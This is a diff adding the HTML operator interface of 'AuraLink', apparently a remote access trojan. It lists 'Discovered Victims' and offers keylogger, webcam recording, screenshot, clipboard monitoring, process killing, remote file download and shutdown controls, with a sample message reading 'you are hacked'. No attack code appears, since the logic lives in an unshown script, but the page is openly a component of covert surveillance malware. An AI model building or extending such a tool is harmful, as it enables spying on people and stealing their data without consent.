@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AuraLink</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div id="intro-overlay">
+        <div class="intro-card">
+
+            <div class="intro-header" id="intro-header-area">
+                <div class="intro-logo">
+                    <i data-lucide="link"></i>
+                </div>
+                <div class="intro-text">
+                    <h1>AuraLink</h1>
+                    <p>Registry Mode: Localhost (127.0.0.1)</p>
+                </div>
+            </div>
+
+            <div id="intro-main-view">
+                <div class="action-buttons">
+                    <button class="large-btn btn-gradient-blue" id="btnConnectRegistry" onclick="handleIntroScan()">
+                        <i data-lucide="zap"></i> Connect & Discover
+                    </button>
+                </div>
+            </div>
+
+            <div id="intro-scan-view" class="hidden-none">
+                <div class="scan-header-bar">
+                    <h3 style="font-size:1.2rem; display:flex; align-items:center; gap:10px;">
+                        <i data-lucide="loader-2" class="spinning" style="color:#3b82f6"></i>
+                        Discovered Victims
+                    </h3>
+                    <button class="btn-icon-small" onclick="toggleScanView()" title="Back">
+                        <i data-lucide="x"></i>
+                    </button>
+                </div>
+
+                <div style="text-align:left; margin-bottom:10px; color:#64748b;">
+                    <span id="scan-status-text">Fetching list from Registry...</span>
+                </div>
+
+                <div id="scan-results" class="scan-results-list">
+                </div>
+
+                <div class="scan-footer-actions">
+                    <button class="btn-secondary" onclick="handleIntroScan()">Refresh List</button>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <aside class="sidebar">
+        <div class="sidebar-header">
+            <div class="logo-box"><i data-lucide="link" class="logo-icon"></i></div>
+        </div>
+        <nav class="nav-menu">
+            <button class="nav-item active" onclick="switchTab('home', this)"><i data-lucide="home"></i></button>
+            <button class="nav-item" onclick="switchTab('apps', this)"><i data-lucide="app-window"></i></button>
+            <button class="nav-item" onclick="switchTab('processes', this)"><i data-lucide="activity"></i></button>
+            <button class="nav-item" onclick="switchTab('media', this)"><i data-lucide="camera"></i></button>
+            <button class="nav-item" onclick="switchTab('webcam', this)"><i data-lucide="video"></i></button>
+
+            <button class="nav-item" onclick="switchTab('clipboard', this)"><i data-lucide="clipboard"></i></button>
+            <button class="nav-item" onclick="switchTab('tts', this)"><i data-lucide="megaphone"></i></button>
+
+            <button class="nav-item" onclick="switchTab('keylogger', this)"><i data-lucide="keyboard"></i></button>
+            <button class="nav-item" onclick="switchTab('files', this)"><i data-lucide="file-down"></i></button>
+            <div class="spacer"></div>
+            <button class="nav-item power-nav" onclick="switchTab('power', this)"><i data-lucide="power"></i></button>
+        </nav>
+    </aside>
+
+    <main class="main-content">
+        <header class="top-bar">
+            <h2 id="page-title">Home</h2>
+            <div class="right-header-group">
+                <div class="status-bar-pill">
+                    <div class="status-item" id="top-status-keylog">
+                        <span class="indicator"></span> Keylogger
+                    </div>
+                    <div class="divider-vertical"></div>
+                    <div class="status-item" id="top-status-webcam">
+                        <span class="indicator"></span> Webcam
+                    </div>
+                </div>
+
+                <div class="connection-area" id="conn-area-disconnected">
+                    <div class="input-pill">
+                        <i data-lucide="network"></i>
+                        <input type="text" id="ipInput" placeholder="192.168.1.X">
+                    </div>
+                    <button class="btn-gradient-blue" id="btnConnect">Connect</button>
+                </div>
+
+                <div class="connection-area hidden" id="conn-area-connected">
+                    <div class="status-dot connected"></div>
+                    <span id="connected-ip-label" style="font-weight: 600; font-size: 0.9rem; color: #34d399; margin-right: 10px;">Connected</span>
+                    <button class="btn-danger-red small" onclick="disconnectServer()">
+                        <i data-lucide="log-out" style="width: 16px;"></i> Disconnect
+                    </button>
+                </div>
+            </div>
+        </header>
+
+        <div class="content-wrapper">
+            <section id="tab-home" class="tab-content active">
+                <div class="dashboard-grid">
+                    <div class="card sys-info-card">
+                        <div class="card-header-home"><i data-lucide="monitor" class="icon-header"></i><h3>System Info</h3></div>
+                        <div class="info-content">
+                            <div class="info-row"><span>Hostname</span> <strong id="sys-hostname">---</strong></div>
+                            <div class="info-row"><span>OS</span> <strong id="sys-os">---</strong></div>
+                            <div class="info-row"><span>Uptime</span> <strong id="sys-uptime">--:--:--</strong></div>
+                            <div class="info-row"><span>Network</span> <strong id="sys-network" class="text-red">Disconnected</strong></div>
+                        </div>
+                    </div>
+                    <div class="card resources-card">
+                        <div class="card-header-home"><i data-lucide="cpu" class="icon-header"></i><h3>Resources</h3></div>
+                        <div class="charts-container">
+                            <div class="chart-box">
+                                <div class="circular-chart" id="chart-cpu" style="--p:0; --c:#60a5fa;"><span>0%</span></div><p>CPU Usage</p>
+                            </div>
+                            <div class="chart-box">
+                                <div class="circular-chart" id="chart-ram" style="--p:0; --c:#f472b6;"><span>0%</span></div><p>RAM Usage</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="card sensors-card">
+                        <div class="card-header-home"><i data-lucide="zap" class="icon-header"></i><h3>Live Status</h3></div>
+                        <div class="sensor-grid">
+                            <div class="sensor-item"><span>Disk C: Free</span> <strong id="status-disk" style="color:#f472b6">---</strong></div>
+                            <div class="sensor-item"><span>Processes</span> <strong id="status-procs" style="color:#60a5fa">---</strong></div>
+                            <div class="sensor-item"><span>RAM Free</span> <strong id="status-ram" style="color:#60a5fa">---</strong></div>
+                            <div class="sensor-item"><span>Battery</span> <strong id="status-batt" style="color:#f472b6">---</strong></div>
+                        </div>
+                    </div>
+                    <div class="card logs-card">
+                        <div class="card-header-home"><i data-lucide="history" class="icon-header"></i><h3>Recent Activity</h3></div>
+                        <div class="activity-scroll">
+                            <ul class="activity-list" id="activity-list"><li><span class="dot-log blue"></span> Waiting for connection...</li></ul>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="tab-apps" class="tab-content">
+                <div class="card full-height">
+                    <div class="card-header"><h3>Application Manager</h3></div>
+                    <div class="control-bar">
+                        <input type="text" id="appInput" placeholder="App Name (e.g. notepad)..." class="glass-input grow">
+                        <button class="btn-gradient-blue" onclick="handleAppAction('start')"><i data-lucide="play" class="btn-icon-inside"></i> Start</button>
+                        <button class="btn-danger-red" onclick="handleAppAction('stop')"><i data-lucide="square" class="btn-icon-inside"></i> Stop</button>
+                        <div class="divider"></div>
+                        <button class="btn-secondary" onclick="sendCmd('list-app')">List</button>
+                        <button class="btn-icon-only" onclick="sendCmd('list-app')"><i data-lucide="refresh-cw"></i></button>
+                    </div>
+                    <div class="table-wrapper">
+                        <table class="glass-table">
+                            <thead><tr><th style="width:50px">Icon</th><th>App Name</th><th>Path</th><th>Status</th></tr></thead>
+                            <tbody id="app-list-body"><tr><td colspan="4" class="text-center">Press List to view installed apps</td></tr></tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+
+            <section id="tab-processes" class="tab-content">
+                <div class="card full-height">
+                    <div class="card-header"><h3>System Processes</h3></div>
+                    <div class="control-bar">
+                        <input type="text" id="procInput" placeholder="PID or Name..." class="glass-input grow">
+                        <button class="btn-gradient-blue" onclick="handleProcessAction('start')"><i data-lucide="play" class="btn-icon-inside"></i> Start</button>
+                        <button class="btn-danger-red" onclick="handleProcessAction('kill')"><i data-lucide="x-circle" class="btn-icon-inside"></i> Kill</button>
+                        <div class="divider"></div>
+                        <button class="btn-secondary" onclick="sendCmd('ps')">List</button>
+                        <button class="btn-icon-only" onclick="sendCmd('ps')"><i data-lucide="refresh-cw"></i></button>
+                    </div>
+                    <div class="table-wrapper">
+                        <table class="glass-table">
+                            <thead>
+                                <tr>
+                                    <th>PID</th>
+                                    <th>Name</th>
+                                    <th>Threads</th>
+                                    <th>RAM (MB)</th>
+                                    <th style="width: 60px;">Action</th>
+                                </tr>
+                            </thead>
+                            <tbody id="process-list-body">
+                                <tr><td colspan="5" class="text-center">Click List or Refresh to load data</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+
+            <section id="tab-media" class="tab-content">
+                <div class="split-layout">
+                    <div class="card main-panel">
+                        <div class="card-header"><h3>Screenshot Viewer</h3></div>
+                        <div class="preview-box" id="screenshot-preview">
+                            <div class="placeholder-content">
+                                <i data-lucide="image"></i>
+                                <p>No screenshot captured</p>
+                            </div>
+                        </div>
+                        <div class="controls-area">
+                            <button class="btn-gradient-hybrid large" onclick="requestScreenshot()">
+                                <i data-lucide="aperture" class="btn-icon-inside"></i> Capture Screen
+                            </button>
+                            <div id="screenshot-download-area">
+                                <div class="download-bar">
+                                    <select id="img-format" class="glass-input compact">
+                                        <option value="png">PNG (High Quality)</option>
+                                        <option value="jpeg">JPG (Small Size)</option>
+                                    </select>
+                                    <button onclick="downloadScreenshot()" class="btn-download-pill" id="btn-save-screen" disabled style="opacity: 0.5; cursor: not-allowed;">
+                                        <i data-lucide="download"></i> Save
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="card history-panel">
+                        <div class="card-header">
+                            <h3>History</h3>
+                            <button class="btn-icon-small" onclick="clearHistory('screenshot')"><i data-lucide="trash-2"></i></button>
+                        </div>
+                        <div class="history-list" id="screenshot-history-list">
+                            <p class="text-center-small">Empty</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="tab-webcam" class="tab-content">
+                <div class="split-layout">
+                    <div class="card main-panel">
+                        <div class="card-header"><h3>Webcam Stream</h3></div>
+                        <div class="preview-box video-mode" id="webcam-preview">
+                            <div class="placeholder-content">
+                                <i data-lucide="video-off"></i>
+                                <p>Webcam Idle</p>
+                            </div>
+                        </div>
+                        <div class="controls-area">
+                            <button class="btn-gradient-hybrid large" id="btn-record" onclick="toggleWebcam()">
+                                <i data-lucide="radio" class="btn-icon-inside"></i> Record (10s)
+                            </button>
+                            <div id="webcam-download-area" style="min-height: 46px;"></div>
+                        </div>
+                    </div>
+                    <div class="card history-panel">
+                        <div class="card-header">
+                            <h3>History</h3>
+                            <button class="btn-icon-small" onclick="clearHistory('webcam')"><i data-lucide="trash-2"></i></button>
+                        </div>
+                        <div class="history-list" id="webcam-history-list">
+                            <p class="text-center-small">Empty</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="tab-clipboard" class="tab-content">
+                <div class="split-layout">
+                    <div class="card main-panel">
+                        <div class="card-header"><h3>Clipboard Monitor</h3></div>
+                        <div class="control-bar">
+                            <button class="btn-gradient-blue" onclick="startClipboard()"><i data-lucide="play" class="btn-icon-inside"></i> Start</button>
+                            <button class="btn-danger-red" onclick="stopClipboard()"><i data-lucide="square" class="btn-icon-inside"></i> Stop & Save</button>
+                            <div class="divider"></div>
+                            <button class="btn-gradient-hybrid" onclick="sendCmd('get-clip')"><i data-lucide="download-cloud" class="btn-icon-inside"></i> Fetch</button>
+                            <button class="btn-secondary" onclick="clearClipboardDisplay()"><i data-lucide="eraser" class="btn-icon-inside"></i> Clear</button>
+                        </div>
+                        <div class="log-container" id="clip-output"><span class="text-muted">Waiting for clipboard data...</span></div>
+                    </div>
+
+                    <div class="card history-panel">
+                        <div class="card-header">
+                            <h3>History</h3>
+                            <button class="btn-icon-small" onclick="clearHistory('clipboard')"><i data-lucide="trash-2"></i></button>
+                        </div>
+                        <div class="history-list" id="clipboard-history-list">
+                            <p class="text-center-small">Empty</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="tab-tts" class="tab-content">
+                <div class="card" style="max-width: 600px; margin: 0 auto; margin-top: 50px;">
+                    <div class="card-header"><h3>Text to Speech (TTS)</h3></div>
+                    <div style="display: flex; flex-direction: column; gap: 20px;">
+                        <p class="text-muted">Type a message below and the remote computer will speak it out loud.</p>
+                        <textarea id="tts-input" class="glass-input" rows="4" placeholder="Enter text here (e.g., Hello user, you are hacked)..."></textarea>
+                        <button class="btn-gradient-pastel large" onclick="sendTTS()">
+                            <i data-lucide="mic" class="btn-icon-inside"></i> Speak Now
+                        </button>
+                    </div>
+                </div>
+            </section>
+
+            <section id="tab-keylogger" class="tab-content">
+                <div class="split-layout">
+                    <div class="card main-panel">
+                        <div class="card-header">
+                            <h3>Keylogger Records</h3>
+                            <div class="keylog-status-badges">
+                                <span class="badge-status" id="kl-mode">Mode: ---</span>
+                                <span class="badge-status" id="kl-status">Type: ---</span>
+                            </div>
+                        </div>
+
+                        <div class="control-bar" style="margin-bottom: 15px;">
+                            <button class="btn-gradient-blue" onclick="startKeylog()"><i data-lucide="play" class="btn-icon-inside"></i> Start</button>
+
+                            <button class="btn-danger-red" onclick="stopKeylog()"><i data-lucide="square" class="btn-icon-inside"></i> Stop & Save</button>
+
+                            <div class="divider"></div>
+
+                            <button class="btn-secondary" onclick="clearKeylogDisplay()"><i data-lucide="eraser" class="btn-icon-inside"></i> Clear</button>
+                        </div>
+
+                        <div class="keylog-split-view">
+                            <div class="keylog-sub-panel">
+                                <div class="sub-header">RAW KEYS (Phím thực)</div>
+                                <div class="log-container small-text" id="keylog-raw">Waiting...</div>
+                            </div>
+                            <div class="keylog-sub-panel">
+                                <div class="sub-header">FINAL TEXT (Văn bản)</div>
+                                <div class="log-container" id="keylog-text">Waiting...</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card history-panel">
+                        <div class="card-header">
+                            <h3>History</h3>
+                            <button class="btn-icon-small" onclick="clearHistory('keylog')"><i data-lucide="trash-2"></i></button>
+                        </div>
+                        <div class="history-list" id="keylog-history-list">
+                            <p class="text-center-small">Empty</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="tab-power" class="tab-content">
+                <div class="power-wrapper">
+                    <div class="power-card">
+                        <div class="power-icon-bg shutdown-bg"><i data-lucide="power"></i></div>
+                        <button class="btn-power-pill gradient-red" onclick="confirmPower('shutdown')">Shutdown</button>
+                    </div>
+                    <div class="power-card">
+                        <div class="power-icon-bg restart-bg"><i data-lucide="rotate-cw"></i></div>
+                        <button class="btn-power-pill gradient-blue" onclick="confirmPower('restart')">Restart</button>
+                    </div>
+                </div>
+            </section>
+
+            <section id="tab-files" class="tab-content">
+                <div class="card full-height" style="display: flex; flex-direction: column;">
+
+                    <div class="card-header" style="flex-shrink: 0; display: flex; justify-content: space-between; align-items: center;">
+                        <h3>File Explorer</h3>
+                        <button class="btn-mini" onclick="document.getElementById('manual-dl-area').classList.toggle('hidden')" style="font-size: 0.8rem;">
+                            <i data-lucide="terminal"></i> Manual Input
+                        </button>
+                    </div>
+
+                    <div class="control-bar" style="flex-shrink: 0; gap: 8px;">
+                        <button class="btn-icon" onclick="navigateUp()" title="Up one level">
+                            <i data-lucide="arrow-up-left"></i>
+                        </button>
+                        <input type="text" id="currentPath" placeholder="Remote Path" class="glass-input grow" readonly style="font-family: monospace;">
+                        <button class="btn-gradient-blue" onclick="refreshDir()" style="min-width: 80px;">
+                            <i data-lucide="arrow-right"></i> Go
+                        </button>
+                    </div>
+
+                    <div id="manual-dl-area" class="control-bar hidden" style="flex-shrink: 0; margin-top: 10px; background: rgba(0,0,0,0.05); padding: 8px; border-radius: 8px;">
+                        <input type="text" id="filePathInput" placeholder="Enter exact file path to download..." class="glass-input grow">
+                        <button class="btn-gradient-blue" onclick="requestDownloadFile()">
+                            <i data-lucide="download"></i>
+                        </button>
+                    </div>
+
+                    <div class="file-split-view">
+
+                        <div class="file-browser-wrapper">
+                            <h4 style="color: var(--text-muted); font-size: 0.85rem; margin-bottom: 5px;">Directory Contents</h4>
+                            <div id="file-browser-list" class="file-browser-container">
+                                <div class="scan-placeholder">
+                                    <i data-lucide="folder-search" style="width:40px; height:40px; margin-bottom:10px; opacity:0.5"></i>
+                                    <p>Click "Go" to browse files</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="file-history-wrapper">
+                            <h4 style="color: var(--text-muted); font-size: 0.85rem; margin-bottom: 5px;">Download History</h4>
+                            <div id="file-download-list" class="scan-results-list" style="background: rgba(255,255,255,0.2);">
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </section>
+        </div>
+    </main>
+
+    <div id="toast-container"></div>
+
+    <script src="client.js"></script>
+    <script>if(typeof lucide !== 'undefined') lucide.createIcons();</script>
+</body>
+</html>
